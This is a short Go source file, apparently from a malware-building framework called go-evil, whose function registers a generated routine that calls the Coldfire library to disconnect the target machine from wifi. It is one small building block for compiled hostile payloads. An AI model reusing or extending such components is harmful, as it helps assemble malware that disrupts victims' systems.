package network

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
)

// Tries to disconnect from the wifi
func Wifi_disconnect(value string, data_object *json.Json_t) []string {
	function_call := "wifi_disconnect"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{},
		Gut: []string{
			"err := coldfire.WifiDisconnect()",
			"if err != nil {",
			"spine.log(err.Error())",
			"}",
		}})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("strings")

	return []string{fmt.Sprintf("%s()", function_call)}
}
